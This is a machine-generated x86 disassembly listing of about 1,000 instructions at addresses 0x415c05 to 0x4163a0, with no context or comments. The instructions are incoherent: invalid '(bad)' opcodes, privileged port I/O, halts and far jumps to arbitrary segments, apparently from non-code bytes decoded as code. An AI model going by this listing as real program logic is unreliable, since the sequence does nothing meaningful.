  415c05:	or     DWORD PTR [ecx],edi
  415c07:	or     ah,BYTE PTR [edx]
  415c09:	and    ecx,edi
  415c0b:	mov    bl,0x3c
  415c0d:	fmul   st,st(6)
  415c0f:	loopne 0x415c4e
  415c11:	cli    
  415c12:	nop
  415c13:	xchg   ebx,eax
  415c14:	jge    0x415c75
  415c16:	xchg   edi,eax
  415c17:	add    eax,0x68d53fd7
  415c1c:	jno    0x415bbd
  415c1e:	out    0x28,eax
  415c20:	and    edx,ecx
  415c22:	cmp    al,0x33
  415c24:	daa    
  415c25:	inc    edi
  415c26:	addr16 in al,0x3a
  415c29:	ret    
  415c2a:	xchg   esi,eax
  415c2b:	lods   eax,DWORD PTR ds:[esi]
  415c2c:	jecxz  0x415c33
  415c2e:	pop    edx
  415c2f:	loop   0x415bb1
  415c31:	xchg   BYTE PTR [ebp-0x39772ffa],dl
  415c37:	jl     0x415bf1
  415c39:	push   0x2a
  415c3b:	pop    esp
  415c3c:	iret   
  415c3d:	daa    
  415c3e:	inc    ecx
  415c3f:	push   eax
  415c40:	stos   BYTE PTR es:[edi],al
  415c41:	imul   eax,DWORD PTR [ebx-0x5c291a0c],0x43f35960
  415c4b:	and    DWORD PTR [ecx+0x6575b7f7],ebp
  415c51:	call   DWORD PTR [ecx]
  415c53:	push   0x3f8c65e5
  415c58:	cmp    BYTE PTR [ecx],bl
  415c5a:	call   DWORD PTR [edx+0x6d]
  415c5d:	mov    dh,0xf5
  415c5f:	inc    DWORD PTR [edi+0x7c268f70]
  415c65:	jecxz  0x415c8c
  415c67:	inc    esi
  415c68:	xor    esi,DWORD PTR [edx+eax*4+0x41]
  415c6c:	dec    edx
  415c6d:	daa    
  415c6e:	push   esp
  415c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c70:	in     al,0x52
  415c72:	sub    eax,0x5a6053fa
  415c77:	add    ebx,esp
  415c79:	hlt    
  415c7a:	shl    ebx,1
  415c7c:	std    
  415c7d:	repnz stc 
  415c7f:	cmp    al,0xa
  415c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c82:	(bad)  
  415c83:	js     0x415c91
  415c85:	adc    DWORD PTR [edx+0x27c1abf1],esp
  415c8b:	dec    esi
  415c8c:	add    BYTE PTR [esi+0x57c61567],dh
  415c92:	and    DWORD PTR [esi],ebx
  415c94:	addr16 (bad) 
  415c96:	fdiv   DWORD PTR [ecx-0x3]
  415c99:	retf   
  415c9a:	adc    al,0xb5
  415c9c:	cmc    
  415c9d:	in     al,dx
  415c9e:	aas    
  415c9f:	inc    eax
  415ca0:	cdq    
  415ca1:	sub    BYTE PTR [esi+0x2e91a58],ah
  415ca7:	jae    0x415c7d
  415ca9:	ret    
  415caa:	and    eax,DWORD PTR [eax+0x57]
  415cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cae:	loope  0x415cf0
  415cb0:	mov    bl,0x9b
  415cb2:	ficom  WORD PTR [ecx+0x2d]
  415cb5:	inc    edi
  415cb6:	jbe    0x415d07
  415cb8:	in     al,0x31
  415cba:	sub    esi,DWORD PTR [ebp-0x4b]
  415cbd:	sub    al,0x39
  415cbf:	lods   al,BYTE PTR ds:[esi]
  415cc0:	mov    fs,ebp
  415cc2:	lea    eax,[edx]
  415cc4:	fdivrp st(2),st
  415cc6:	lods   eax,DWORD PTR ds:[esi]
  415cc7:	aam    0x91
  415cc9:	adc    DWORD PTR [edx+0x3a],edx
  415ccc:	dec    edi
  415ccd:	popf   
  415cce:	xchg   ebp,eax
  415ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cd0:	mov    dl,0xa7
  415cd2:	inc    ebp
  415cd3:	adc    ebx,DWORD PTR [eax+eiz*2]
  415cd6:	enter  0x51d1,0xaf
  415cda:	xchg   edx,eax
  415cdb:	mov    eax,0x281ee495
  415ce0:	add    BYTE PTR [edx+0x118cfb66],ah
  415ce6:	mov    ch,0xe6
  415ce8:	fadd   DWORD PTR [ebp+0x5]
  415ceb:	mov    esi,esi
  415ced:	out    0xb3,al
  415cef:	pop    esp
  415cf0:	and    DWORD PTR [esi],0xd184ecb4
  415cf6:	push   edi
  415cf7:	loope  0x415d43
  415cf9:	sar    BYTE PTR [ecx-0x6f2ce14],cl
  415cff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d00:	sub    dl,ah
  415d02:	test   eax,0x83629e74
  415d07:	or     al,0xe4
  415d09:	iret   
  415d0a:	and    al,0x9a
  415d0c:	test   al,0xda
  415d0e:	das    
  415d0f:	cli    
  415d10:	push   esi
  415d11:	jmp    0xedc5:0x271cdf7c
  415d18:	xchg   edx,eax
  415d19:	pop    esi
  415d1a:	mov    ch,0xad
  415d1c:	xor    eax,0x8ef081e6
  415d21:	outs   dx,BYTE PTR ds:[esi]
  415d22:	or     BYTE PTR [eax],dh
  415d24:	outs   dx,DWORD PTR ds:[esi]
  415d25:	sub    eax,0xc4093a76
  415d2a:	jb     0x415d11
  415d2c:	inc    esp
  415d2d:	imul   esp,ebx,0x9a60d4d9
  415d33:	es jae 0x415d01
  415d36:	daa    
  415d37:	mov    ebx,0xb184e2fb
  415d3c:	leave  
  415d3d:	in     al,0xb0
  415d3f:	lea    ebx,[edi]
  415d41:	sub    al,0x36
  415d43:	jne    0x415dc2
  415d45:	sbb    edi,ebp
  415d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d48:	push   edx
  415d49:	inc    ebp
  415d4a:	xlat   BYTE PTR ds:[ebx]
  415d4b:	outs   dx,BYTE PTR ds:[esi]
  415d4c:	sbb    ch,ch
  415d4e:	jno    0x415cf7
  415d50:	or     edx,DWORD PTR [ebx-0x629c2a2c]
  415d56:	add    ch,BYTE PTR [esi-0x3f]
  415d59:	dec    edx
  415d5a:	in     al,dx
  415d5b:	add    BYTE PTR [esi],0xef
  415d5e:	push   ecx
  415d5f:	popa   
  415d60:	mov    dl,dh
  415d62:	lods   eax,DWORD PTR ds:[esi]
  415d63:	aad    0x3e
  415d65:	pop    edi
  415d66:	xchg   esi,esp
  415d68:	imul   ecx,DWORD PTR [ecx-0x5cf57ea5],0x9b1ca432
  415d72:	fwait
  415d73:	(bad)  
  415d74:	xor    ebp,DWORD PTR ds:[ecx+0x22846d7f]
  415d7b:	cmp    eax,0xa74025b6
  415d80:	addr16 add eax,0x66bf328e
  415d86:	adc    ebx,DWORD PTR [edx]
  415d88:	push   esp
  415d89:	cmp    al,0xe0
  415d8b:	fnstenv [eax+0x499577ad]
  415d91:	inc    edx
  415d92:	imul   edi,ecx,0xffffffd6
  415d95:	out    dx,eax
  415d96:	idiv   DWORD PTR [esi-0x1b777d0f]
  415d9c:	push   ecx
  415d9d:	daa    
  415d9e:	xlat   BYTE PTR ds:[ebx]
  415d9f:	into   
  415da0:	out    dx,al
  415da1:	mov    eax,0x7eded814
  415da6:	cmp    ecx,eax
  415da8:	adc    BYTE PTR [esi],0xc9
  415dab:	jp     0x415dd3
  415dad:	or     BYTE PTR [ebx-0xb0cb8],ch
  415db3:	inc    ebp
  415db4:	sub    al,0x8c
  415db6:	mov    dl,0x58
  415db8:	jecxz  0x415d6d
  415dba:	inc    ecx
  415dbb:	fsubr  QWORD PTR [edi-0x54]
  415dbe:	adc    DWORD PTR [ecx+0x1a],esi
  415dc1:	leave  
  415dc2:	mov    WORD PTR [edi-0x4],ss
  415dc5:	mov    al,0xc8
  415dc7:	lahf   
  415dc8:	loopne 0x415d5d
  415dca:	(bad)  [eax-0x63acc33f]
  415dd0:	sub    al,0x10
  415dd2:	es pop eax
  415dd4:	pcmpgtb mm6,mm1
  415dd7:	ret    0x14cc
  415dda:	sbb    BYTE PTR [edi],al
  415ddc:	push   edx
  415ddd:	jl     0x415df1
  415ddf:	or     edi,DWORD PTR [esi+esi*4+0x22]
  415de3:	out    0xbc,eax
  415de5:	leave  
  415de6:	rcl    dl,cl
  415de8:	int    0x4e
  415dea:	not    esi
  415dec:	jnp    0x415e2b
  415dee:	mov    ecx,0x4fbce4d0
  415df3:	and    BYTE PTR [ecx],dh
  415df5:	and    dl,ch
  415df7:	(bad)  [edx+0x18]
  415dfa:	dec    edi
  415dfb:	push   cs
  415dfc:	shl    DWORD PTR [esi+0x3cee54d0],0xb
  415e03:	sbb    al,0x48
  415e05:	push   cs
  415e06:	inc    ebx
  415e07:	adc    eax,0x21b6ecc9
  415e0c:	dec    edi
  415e0d:	sub    eax,0xc2797ab6
  415e12:	and    ebp,DWORD PTR [esp+ebx*4]
  415e15:	loope  0x415e1f
  415e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e18:	cdq    
  415e19:	clc    
  415e1a:	inc    esi
  415e1b:	xor    edi,DWORD PTR [esi]
  415e1d:	sub    al,0xb8
  415e1f:	clc    
  415e20:	cli    
  415e21:	add    dl,BYTE PTR [esi+0x7c644d80]
  415e27:	xor    eax,0x59eb5ef3
  415e2c:	xor    DWORD PTR [ebp-0x9],eax
  415e2f:	out    0x69,al
  415e31:	mov    bh,BYTE PTR [ebx+0x2d01acd0]
  415e37:	sbb    DWORD PTR [ecx-0x65],esi
  415e3a:	ss pop edi
  415e3c:	push   es
  415e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e3e:	and    al,0xaa
  415e40:	push   0x3c
  415e42:	retf   
  415e43:	fwait
  415e44:	jne    0x415e20
  415e46:	lds    ebp,FWORD PTR [edx+0x1c]
  415e49:	add    BYTE PTR [esi+0x6f],cl
  415e4c:	leave  
  415e4d:	in     eax,0xa2
  415e4f:	pop    esi
  415e50:	arpl   WORD PTR ds:0x14c32ade,ax
  415e56:	jnp    0x415ea8
  415e58:	test   DWORD PTR [edi+edi*4+0x64],ecx
  415e5c:	fadd   QWORD PTR [ebx+0x25f8c370]
  415e62:	ins    BYTE PTR es:[edi],dx
  415e63:	ror    BYTE PTR [edi],0x26
  415e66:	out    0x33,eax
  415e68:	jmp    0x115064c9
  415e6d:	in     eax,dx
  415e6e:	or     DWORD PTR [eax],ecx
  415e70:	loopne 0x415ea0
  415e72:	jmp    0x5a17378f
  415e77:	je     0x415ebc
  415e79:	jle    0x415edd
  415e7b:	fnstcw WORD PTR ds:0xb1067596
  415e81:	push   esi
  415e82:	or     al,0xe
  415e84:	xchg   DWORD PTR [edx-0x40dedbbb],edi
  415e8a:	cmc    
  415e8b:	pop    ebx
  415e8c:	push   ebx
  415e8d:	addr16 popf 
  415e8f:	sbb    ch,ch
  415e91:	dec    ebx
  415e92:	(bad)  
  415e93:	pop    ss
  415e94:	jnp    0x415e52
  415e96:	inc    esi
  415e97:	test   al,0x4c
  415e99:	jns    0x415e6c
  415e9b:	and    BYTE PTR [edx],ch
  415e9d:	mov    al,0x70
  415e9f:	shl    al,cl
  415ea1:	push   ecx
  415ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ea3:	xrelease mov DWORD PTR [ebp+0x2f6c5090],ebx
  415eaa:	mov    ds:0xa3585b5c,eax
  415eaf:	data16 scas al,BYTE PTR es:[edi]
  415eb1:	mov    al,ds:0xc0cd1c2e
  415eb6:	push   ebp
  415eb7:	div    DWORD PTR gs:[edi+0x65f0fa78]
  415ebe:	call   0xab34ce1f
  415ec3:	ja     0x415f3c
  415ec5:	sub    eax,DWORD PTR [edx-0x70f04192]
  415ecb:	xchg   ecx,eax
  415ecc:	aad    0xc9
  415ece:	jl     0x415e61
  415ed0:	sub    al,0x56
  415ed2:	arpl   WORD PTR [edx-0x3b9b9a9e],bp
  415ed8:	mov    eax,0xf8ce6756
  415edd:	mov    bl,0x2a
  415edf:	int3   
  415ee0:	hlt    
  415ee1:	fisttp DWORD PTR [eax]
  415ee3:	jmp    0xd253:0xe09a6c03
  415eea:	fmul   QWORD PTR [edx-0x7c]
  415eed:	push   0x27
  415eef:	retf   
  415ef0:	xchg   ecx,eax
  415ef1:	add    esp,edi
  415ef3:	jne    0x415ef6
  415ef5:	or     BYTE PTR [ebp+edx*8-0x340a8da],dh
  415efc:	test   al,0xb9
  415efe:	mov    edx,0x33a63074
  415f03:	push   eax
  415f04:	ins    DWORD PTR es:[edi],dx
  415f05:	jle    0x415f7f
  415f07:	shr    DWORD PTR [ebp-0x8],1
  415f0a:	mov    esp,DWORD PTR [ebx]
  415f0c:	das    
  415f0d:	jns    0x415f14
  415f0f:	inc    esi
  415f10:	and    DWORD PTR [ebx],eax
  415f12:	inc    edi
  415f13:	stos   BYTE PTR es:[edi],al
  415f14:	cli    
  415f15:	jg     0x415f50
  415f17:	imul   ebx,DWORD PTR [esi+0x61],0x220b493d
  415f1e:	adc    DWORD PTR [edx+0x1b],0x19
  415f22:	mov    edi,0xbc87ac43
  415f27:	out    dx,eax
  415f28:	cdq    
  415f29:	jbe    0x415ee7
  415f2b:	sbb    eax,0x30c15572
  415f30:	arpl   WORD PTR [ecx-0xe],bx
  415f33:	aad    0x48
  415f35:	test   eax,0xad285d7c
  415f3a:	mov    bh,0xa6
  415f3c:	jg     0x415f81
  415f3e:	lahf   
  415f3f:	shl    DWORD PTR [edx],1
  415f41:	sahf   
  415f42:	jge    0x415f9b
  415f44:	jecxz  0x415f17
  415f46:	adc    al,ah
  415f48:	sub    al,0xaf
  415f4a:	or     ch,BYTE PTR [esi]
  415f4c:	fdivr  st,st(3)
  415f4e:	int3   
  415f4f:	loopne 0x415f61
  415f51:	pop    esi
  415f52:	fs jns 0x415ed7
  415f55:	push   ebx
  415f56:	mov    dh,0x3e
  415f58:	mov    ah,0x2a
  415f5a:	hlt    
  415f5b:	dec    edi
  415f5c:	inc    ecx
  415f5d:	inc    eax
  415f5e:	mov    ecx,0x3d9069f3
  415f63:	jp     0x415fc1
  415f65:	sub    DWORD PTR [ecx+0x5d883d3],edx
  415f6b:	mov    WORD PTR [edx-0x4c],ds
  415f6e:	cmp    DWORD PTR [ebx+eax*8-0x5e],edx
  415f72:	push   ss
  415f73:	sar    edx,0x22
  415f76:	out    dx,al
  415f77:	or     DWORD PTR [edi+ebp*4],eax
  415f7a:	ds fs int 0x6f
  415f7e:	xor    dl,0xc
  415f81:	jo     0x416002
  415f83:	mov    esp,0x670afaec
  415f88:	add    BYTE PTR [edx+0x1],dl
  415f8b:	pop    es
  415f8c:	lods   eax,DWORD PTR ds:[esi]
  415f8d:	(bad)  
  415f8e:	and    eax,0xe71de7ae
  415f93:	xor    bh,bh
  415f95:	cmp    al,0xc0
  415f97:	xlat   BYTE PTR ds:[ebx]
  415f98:	test   DWORD PTR [ecx],ebx
  415f9a:	xchg   edx,eax
  415f9b:	lahf   
  415f9c:	add    esp,DWORD PTR ds:0x90e0c018
  415fa2:	popa   
  415fa3:	jno    0x41600e
  415fa5:	push   ecx
  415fa6:	mov    ds:0xf6e3e8f0,eax
  415fab:	mov    al,ds:0x3ab3c556
  415fb0:	inc    ecx
  415fb1:	mov    eax,ds:0xa7fab743
  415fb6:	push   edi
  415fb7:	std    
  415fb8:	fwait
  415fb9:	div    BYTE PTR [ebx-0x80]
  415fbc:	hlt    
  415fbd:	add    DWORD PTR ds:0x2cf0815b,eax
  415fc3:	in     al,0x2
  415fc5:	mov    edi,0xf4e646b5
  415fca:	cs dec ebx
  415fcc:	imul   DWORD PTR [edx+esi*8+0x2a4e39ff]
  415fd3:	pusha  
  415fd4:	jmp    0x11fa0fa8
  415fd9:	div    dl
  415fdb:	xchg   ebx,eax
  415fdc:	sbb    al,0xaa
  415fde:	push   es
  415fdf:	sub    al,0xcc
  415fe1:	adc    DWORD PTR [edi],ebx
  415fe3:	idiv   DWORD PTR [ebx+0x54ba02a2]
  415fe9:	iret   
  415fea:	xchg   ecx,eax
  415feb:	repnz test al,0x5e
  415fee:	xchg   edi,eax
  415fef:	pusha  
  415ff0:	sub    al,0xdc
  415ff2:	mov    dl,0xb9
  415ff4:	aad    0x5b
  415ff6:	addr16 rol al,0xe2
  415ffa:	dec    eax
  415ffb:	aas    
  415ffc:	imul   eax,DWORD PTR [ebx],0xffffffb6
  415fff:	pop    edi
  416000:	add    al,0xf2
  416002:	popa   
  416003:	jl     0x415ffc
  416005:	enter  0x754c,0xbd
  416009:	stc    
  41600a:	add    DWORD PTR [eax],ebx
  41600c:	jle    0x416007
  41600e:	jge    0x415fa5
  416010:	jbe    0x41604c
  416012:	push   edi
  416013:	dec    esp
  416014:	iretw  
  416016:	pop    edi
  416017:	mov    DWORD PTR [eax],0x22e736f7
  41601d:	je     0x41608b
  41601f:	int    0x4
  416021:	mov    al,ds:0x6487f4f1
  416026:	outs   dx,DWORD PTR ds:[esi]
  416027:	inc    ebx
  416028:	or     ah,BYTE PTR [ecx-0x31693d5d]
  41602e:	dec    ebx
  41602f:	leave  
  416030:	ins    BYTE PTR es:[edi],dx
  416031:	sub    DWORD PTR [eax-0x21df773f],eax
  416037:	mov    al,ds:0x893c5d64
  41603c:	push   ebx
  41603d:	inc    ebx
  41603e:	or     al,0x4b
  416040:	aaa    
  416041:	jb     0x4160a3
  416043:	ins    BYTE PTR es:[edi],dx
  416044:	dec    edi
  416045:	jge    0x416077
  416047:	popf   
  416048:	add    eax,0x7426b68a
  41604d:	add    BYTE PTR [edx+edi*4],bh
  416050:	js     0x416014
  416052:	fimul  DWORD PTR [edi-0x2aa791d1]
  416058:	and    al,0x5a
  41605a:	xor    bh,BYTE PTR [esi+0x2ebf1866]
  416060:	mov    esp,0x45d55320
  416065:	(bad)  
  416066:	icebp  
  416067:	dec    edi
  416068:	sbb    eax,0xd61de5a
  41606d:	out    0xa9,al
  41606f:	adc    eax,0xe14e0e7
  416074:	pop    es
  416075:	add    eax,0xe280fdec
  41607a:	jno    0x41607f
  41607c:	jbe    0x416012
  41607e:	in     al,dx
  41607f:	daa    
  416080:	fisttp WORD PTR [edi-0x68]
  416083:	xor    bh,BYTE PTR [edi]
  416085:	xor    eax,0xe771a594
  41608a:	jns    0x4160e2
  41608c:	mov    edi,0x57368f1b
  416091:	or     ch,BYTE PTR [edi-0x733e8fa6]
  416097:	ja     0x416031
  416099:	rcl    ebx,cl
  41609b:	test   al,0x69
  41609d:	inc    edi
  41609e:	sub    ah,BYTE PTR [edx]
  4160a0:	aam    0xea
  4160a2:	pop    ebp
  4160a3:	enter  0xbc21,0x16
  4160a7:	not    esp
  4160a9:	cwde   
  4160aa:	pop    ecx
  4160ab:	pop    edi
  4160ac:	pushf  
  4160ad:	adc    ecx,ecx
  4160af:	cli    
  4160b0:	(bad)  
  4160b1:	mov    WORD PTR [eax],?
  4160b3:	sbb    DWORD PTR [ecx-0x4a],esp
  4160b6:	mov    DWORD PTR [eax-0x36],ecx
  4160b9:	call   0x913e6f26
  4160be:	out    0x43,al
  4160c0:	les    ebp,FWORD PTR [ecx]
  4160c2:	retf   
  4160c3:	sar    al,0xf6
  4160c6:	sub    DWORD PTR [ebp-0x54c93630],ebx
  4160cc:	push   edx
  4160cd:	sar    dh,cl
  4160cf:	or     BYTE PTR [edi+0x5e87e2a9],bl
  4160d5:	mov    ecx,es
  4160d7:	xchg   ebp,eax
  4160d8:	test   al,0x94
  4160da:	jg     0x41609b
  4160dc:	ret    0x275c
  4160df:	sti    
  4160e0:	repnz std 
  4160e2:	jmp    0xb19f:0x965d6a27
  4160e9:	loop   0x4160d5
  4160eb:	jns    0x416091
  4160ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ee:	adc    dl,dl
  4160f0:	mov    DWORD PTR cs:[ebx+0x49],ebx
  4160f4:	stos   DWORD PTR es:[edi],eax
  4160f5:	adc    BYTE PTR [edx+0x530f777e],ah
  4160fb:	scas   al,BYTE PTR es:[edi]
  4160fc:	out    dx,al
  4160fd:	(bad)  
  4160fe:	sbb    edi,DWORD PTR [edi]
  416100:	push   0x700ff08e
  416105:	dec    edi
  416106:	sub    al,0xe8
  416108:	lods   al,BYTE PTR ds:[esi]
  416109:	stc    
  41610a:	add    DWORD PTR [esi-0x4560599b],esi
  416110:	ret    0xe3ea
  416113:	daa    
  416114:	xor    DWORD PTR [ecx],ebx
  416116:	xor    DWORD PTR [ecx],edi
  416118:	imul   esp,DWORD PTR [edi],0xffffffa9
  41611b:	mov    ebp,0xf48f5fc8
  416120:	ror    BYTE PTR [edi+ecx*8],1
  416123:	jp     0x41612f
  416125:	clc    
  416126:	in     eax,0x8d
  416128:	retf   0xf515
  41612b:	and    eax,0xa5be3ff0
  416130:	inc    ebp
  416131:	pop    ss
  416132:	cld    
  416133:	in     al,dx
  416134:	js     0x416164
  416136:	xor    DWORD PTR [edi],ebx
  416138:	sbb    ebx,DWORD PTR [eax+0x147fdf50]
  41613e:	popf   
  41613f:	mov    ebp,0x3623314a
  416144:	sub    bh,BYTE PTR [edx-0x64c78045]
  41614a:	mov    esp,0xfa785b9e
  41614f:	imul   ecx,DWORD PTR [eax-0x23],0x6e
  416153:	imul   edx,ebx,0x4c
  416156:	push   ds
  416157:	push   ss
  416158:	into   
  416159:	enter  0x29cc,0xc6
  41615d:	dec    esp
  41615e:	adc    esi,DWORD PTR [esi-0x1b]
  416161:	cmc    
  416162:	sub    eax,0x4e5b4297
  416167:	pop    eax
  416168:	or     dl,BYTE PTR [ecx]
  41616a:	cld    
  41616b:	idiv   ebp
  41616d:	adc    BYTE PTR [esi],0xd1
  416170:	jns    0x416194
  416172:	mov    ah,0xf3
  416174:	or     eax,0xf255792a
  416179:	mov    fs,ecx
  41617b:	push   ds
  41617c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41617d:	sbb    al,BYTE PTR [edi+ecx*8-0x3]
  416181:	data16 into 
  416183:	jg     0x41617e
  416185:	lea    ebx,[edi-0x59]
  416188:	jb     0x41615e
  41618a:	cmc    
  41618b:	ds ins DWORD PTR es:[edi],dx
  41618d:	hlt    
  41618e:	dec    esi
  41618f:	in     eax,0x6f
  416191:	jp     0x4161bd
  416193:	ins    DWORD PTR es:[edi],dx
  416194:	rcl    BYTE PTR [esi+eax*4],1
  416197:	pop    eax
  416198:	imul   BYTE PTR [ebx+0x29348d19]
  41619e:	fldenv [ebx+0x65a1b4d5]
  4161a4:	ins    DWORD PTR es:[edi],dx
  4161a5:	std    
  4161a6:	fldcw  WORD PTR [ebx-0x7b]
  4161a9:	or     BYTE PTR [edx-0x59b99652],cl
  4161af:	sbb    BYTE PTR [ecx+0x345c6925],0x77
  4161b6:	aaa    
  4161b7:	jp     0x4161ac
  4161b9:	or     eax,0x44b09986
  4161be:	(bad)  
  4161c0:	mov    bh,0xc8
  4161c2:	dec    ebp
  4161c3:	adc    eax,0xdf8fc687
  4161c8:	bound  esp,QWORD PTR [ecx]
  4161ca:	xchg   BYTE PTR [ebp+0x8582e51],ch
  4161d0:	ror    BYTE PTR [edx+0xd],cl
  4161d3:	add    eax,0xb1dd8e3f
  4161d8:	mov    eax,0x3d30ab45
  4161dd:	mov    esi,0xe6e3f520
  4161e2:	mov    ds:0x8cba37a,eax
  4161e7:	repz shr BYTE PTR [ebx],cl
  4161ea:	dec    ebx
  4161eb:	fsub   st,st(0)
  4161ed:	jnp    0x416246
  4161ef:	repz xor esi,DWORD PTR [edx+0x794d83f8]
  4161f6:	ins    BYTE PTR es:[edi],dx
  4161f7:	push   edi
  4161f8:	arpl   si,di
  4161fa:	in     eax,dx
  4161fb:	add    BYTE PTR [edx],0x16
  4161fe:	jg     0x416272
  416200:	int    0xaf
  416202:	xor    DWORD PTR [edx],0xbc99227b
  416208:	mov    bh,0x4b
  41620a:	mov    ds:0x74150ab7,al
  41620f:	mov    eax,0xd66d6ab9
  416214:	mov    ds:0x3fb6bf44,al
  416219:	adc    BYTE PTR [esi+edx*2],ch
  41621c:	xor    dh,bh
  41621e:	sbb    DWORD PTR [edi+eiz*4],edx
  416221:	stc    
  416222:	pop    es
  416223:	adc    ebp,DWORD PTR [edx-0x47]
  416226:	jl     0x4161c1
  416228:	xchg   BYTE PTR [ecx-0x7c],dh
  41622b:	mov    DWORD PTR [ecx],edx
  41622d:	mov    BYTE PTR gs:[ecx+0x4ae7633b],bh
  416234:	xor    edx,edx
  416236:	bound  ecx,QWORD PTR [edi+0x6f]
  416239:	mov    dl,0x4f
  41623b:	jno    0x4161d6
  41623d:	stos   BYTE PTR es:[edi],al
  41623e:	enter  0xa1cf,0xbb
  416242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416243:	(bad)  
  416244:	aaa    
  416245:	inc    DWORD PTR [edx+0x40a9fd95]
  41624b:	mov    eax,0xced539f4
  416250:	das    
  416251:	pop    ds
  416252:	and    eax,0xc613053e
  416257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416258:	ret    
  416259:	cdq    
  41625a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41625b:	outs   dx,BYTE PTR ds:[esi]
  41625c:	leave  
  41625d:	(bad)  
  41625e:	adc    al,BYTE PTR [eax+ebp*8]
  416261:	push   ebp
  416262:	pop    ebp
  416263:	jmp    0x48a64cc
  416268:	je     0x4162c2
  41626a:	bound  ebx,QWORD PTR [edi+0x6f]
  41626d:	es clc 
  41626f:	inc    ebp
  416270:	dec    edi
  416271:	mov    ebp,0x96d739fc
  416276:	shr    BYTE PTR [ebx+0x4fc75ccf],0x3d
  41627d:	sub    al,0x25
  41627f:	icebp  
  416280:	ins    BYTE PTR es:[edi],dx
  416281:	xchg   ebp,eax
  416282:	or     esi,esi
  416284:	jle    0x416235
  416286:	jnp    0x4162a2
  416288:	imul   ebp,DWORD PTR [eax+0x259b0e5a],0x24928dab
  416292:	inc    edi
  416293:	push   ebp
  416294:	xchg   esi,eax
  416295:	jbe    0x416233
  416297:	es aaa 
  416299:	(bad)  
  41629a:	popa   
  41629b:	scas   eax,DWORD PTR es:[edi]
  41629c:	mov    DWORD PTR [ebx-0x66],ebp
  41629f:	mov    eax,DWORD PTR [edx-0x35]
  4162a2:	sub    BYTE PTR [ebp+0x64],ah
  4162a5:	aam    0x50
  4162a7:	push   ss
  4162a8:	sbb    DWORD PTR [edx+0x5b9208e6],0xbb8e7d0a
  4162b2:	adc    al,0xe0
  4162b4:	mov    dl,0x29
  4162b6:	inc    esi
  4162b7:	bound  edi,QWORD PTR [ecx]
  4162b9:	sub    DWORD PTR [ebp-0x18],edx
  4162bc:	test   ebp,eax
  4162be:	icebp  
  4162bf:	mov    eax,0x4f473fca
  4162c4:	test   BYTE PTR ds:0x32d6ab6f,dl
  4162ca:	mov    esi,0xff6ab52a
  4162cf:	cmp    eax,0x23992bda
  4162d4:	push   ebp
  4162d5:	or     dl,ah
  4162d7:	push   edi
  4162d8:	aaa    
  4162d9:	mov    fs,WORD PTR [ebp+0x51]
  4162dc:	lds    esi,FWORD PTR [ebp-0x38]
  4162df:	in     eax,dx
  4162e0:	jge    0x4162cf
  4162e2:	popf   
  4162e3:	fdiv   QWORD PTR [ebp-0xc]
  4162e6:	add    BYTE PTR [ecx],0x9e
  4162e9:	fucomp st(7)
  4162eb:	push   ebx
  4162ec:	sbb    ah,BYTE PTR [edi+0x2aa9132d]
  4162f2:	inc    esi
  4162f3:	outs   dx,DWORD PTR ds:[esi]
  4162f4:	mov    esi,edi
  4162f6:	dec    ebp
  4162f7:	lahf   
  4162f8:	jl     0x41630c
  4162fa:	mov    ecx,0xf9d8fcb3
  4162ff:	jae    0x416293
  416301:	lods   al,BYTE PTR ds:[esi]
  416302:	cmc    
  416303:	inc    eax
  416304:	inc    edi
  416305:	arpl   WORD PTR [edi+eiz*4],di
  416308:	jnp    0x416305
  41630a:	(bad)
  41630d:	xchg   ecx,eax
  41630e:	aad    0x95
  416310:	ss inc bp
  416313:	fisttp WORD PTR [ebp-0x80]
  416316:	xor    eax,edx
  416318:	cmp    esp,DWORD PTR [edi-0x32]
  41631b:	cmp    eax,0xe18e8299
  416320:	call   0xc1d25964
  416325:	cmp    BYTE PTR [eax+ebp*8+0x63d3a73a],dl
  41632c:	sub    cl,dh
  41632e:	jg     0x4162e8
  416330:	inc    edi
  416331:	out    dx,al
  416332:	outs   dx,BYTE PTR ds:[esi]
  416333:	out    dx,al
  416334:	or     eax,0xbbff76
  416339:	inc    ecx
  41633a:	inc    edx
  41633b:	or     eax,0xc08cdc9b
  416340:	sbb    al,0xcf
  416342:	xor    dl,cl
  416344:	lea    edi,[edx-0x56]
  416347:	xor    edi,ecx
  416349:	adc    DWORD PTR [esi],ecx
  41634b:	sar    BYTE PTR [ebx],0xe5
  41634e:	retf   0x4da1
  416351:	das    
  416352:	jne    0x4162dd
  416354:	push   esp
  416355:	cld    
  416356:	mov    dl,BYTE PTR [esi-0x1f]
  416359:	dec    edx
  41635a:	sar    cl,0x9e
  41635d:	loop   0x4162e3
  41635f:	push   edi
  416360:	in     al,0x13
  416362:	cmp    eax,0xa95ba9ba
  416367:	xor    BYTE PTR [ecx+0x19b3fbd1],0xba
  41636e:	ins    BYTE PTR es:[edi],dx
  41636f:	sbb    ecx,DWORD PTR [eax+0x4d0dc59e]
  416375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416376:	or     bh,bl
  416378:	add    BYTE PTR [ecx],bl
  41637a:	dec    edi
  41637b:	add    BYTE PTR [edx+0x69ddc0ec],ah
  416381:	xor    eax,0x49c7728
  416386:	int3   
  416387:	push   ss
  416388:	out    dx,al
  416389:	sub    dh,BYTE PTR [ecx]
  41638b:	jg     0x41634e
  41638d:	aas    
  41638e:	jns    0x41640a
  416390:	pop    ds
  416391:	xor    al,0x6c
  416393:	lahf   
  416394:	addr16 clc 
  416396:	ss mov dh,0x5f
  416399:	fwait
  41639a:	popf   
  41639b:	in     al,0xa9
  41639d:	jmp    0x416411
  41639f:	stos   BYTE PTR es:[edi],al
  4163a0:	shr    BYTE PTR [ebp+0x1aa4429c],0x1
